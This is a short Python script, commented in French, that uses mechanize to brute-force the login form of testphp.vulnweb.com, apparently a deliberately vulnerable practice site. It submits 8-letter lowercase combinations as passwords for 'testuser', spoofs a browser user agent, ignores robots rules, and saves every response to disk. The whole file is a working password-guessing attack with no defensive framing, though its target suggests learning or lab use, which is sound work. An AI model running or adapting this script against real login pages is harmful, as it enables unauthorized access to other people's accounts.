import mechanize
from itertools import combinations
from string import ascii_lowercase
import os
import time

url = "http://testphp.vulnweb.com/login.php"
browser = mechanize.Browser()

browser.set_handle_robots(False)

# Ajouter des en-têtes pour imiter un navigateur réel
browser.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')]


if not os.path.exists('response'):
    os.makedirs('response')

# Ouvrir l'URL et afficher les formulaires disponibles
browser.open(url)
for form in browser.forms():
    print("Form name:", form.name)
    print(form)

attackNumber = 1


passwords = (p for p in combinations(ascii_lowercase, 8))

for p in passwords:
    try:
        browser.open(url)
        
        # Sélectionner le formulaire de connexion par son nom
        try:
            browser.select_form(predicate=lambda f: f.attrs.get('name') == 'loginform')
        except mechanize.FormNotFoundError:
            print("Form not found on the page.")
            continue
        
        # Remplir le formulaire avec les données de test
        browser["uname"] = 'testuser'  
        browser["pass"] = ''.join(p) 
        res = browser.submit()
        content = res.read()
        
        # Afficher le code de réponse
        print(res.code)
        
        # Écrire la réponse dans un fichier
        with open(f'response/response_{attackNumber}.txt', 'w') as output:
            output.write(content.decode('utf-8'))
        
        print(f"Response for attack number {attackNumber} saved.")
        
        attackNumber += 1
        
        # Délai pour éviter d'éventuelles limitations du serveur
        time.sleep(1)
    
    except Exception as e:
        print(f"An error occurred: {e}")
        continue





